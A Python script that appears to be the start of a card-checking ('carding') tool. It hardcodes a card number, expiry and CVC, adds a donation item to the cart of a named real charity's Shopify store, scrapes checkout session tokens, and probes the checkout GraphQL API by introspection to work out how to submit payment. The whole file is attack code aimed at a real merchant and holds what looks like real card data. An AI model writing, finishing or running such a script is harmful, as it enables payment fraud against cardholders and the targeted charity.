import requests
import re
import json
import html
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

card = '4033060047342909|08|28|667'
n, mm, yy, cvc = card.strip().split('|')

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
})

# 1. Add product to cart
headers1 = {
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW',
    'origin': 'https://wiredministries.com',
    'referer': 'https://wiredministries.com/products/donate',
}
data1 = (
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="utf8"\r\n\r\n✓\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="quantity"\r\n\r\n1\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="add"\r\n\r\n\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
    'Content-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n'
    '------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
)
s.post('https://wiredministries.com/cart/add', headers=headers1, data=data1)

# 2. Checkout
r_co = s.post('https://wiredministries.com/cart', data={'updates[]': '1', 'note': '', 'checkout': 'Check out'})
checkout_html = r_co.text

def get_meta(name):
    m = re.search(rf'<meta name="{name}" content="([^"]+)"', checkout_html)
    if m:
        raw_val = html.unescape(m.group(1))
        return raw_val.strip('"')
    return None

session_token = get_meta("serialized-sessionToken")
source_token = get_meta("serialized-sourceToken")

headers4 = {
    'accept': 'application/json',
    'content-type': 'application/json',
    'origin': 'https://wiredministries.com',
    'referer': f'https://wiredministries.com/checkouts/cn/{source_token}/en-us',
    'x-checkout-one-session-token': session_token,
}

introspect_input = {
    'query': '''query IntrospectInput {
      __schema {
        mutationType {
          fields {
            name
            args {
              name
              type {
                name
                kind
                ofType { name kind }
              }
            }
          }
        }
      }
    }'''
}
r_in = s.post('https://wiredministries.com/checkouts/unstable/graphql', headers=headers4, json=introspect_input)
for f in r_in.json().get('data', {}).get('__schema', {}).get('mutationType', {}).get('fields', []):
    if f.get('name') == 'submitForCompletion':
        print("submitForCompletion Args:", json.dumps(f.get('args'), indent=2))
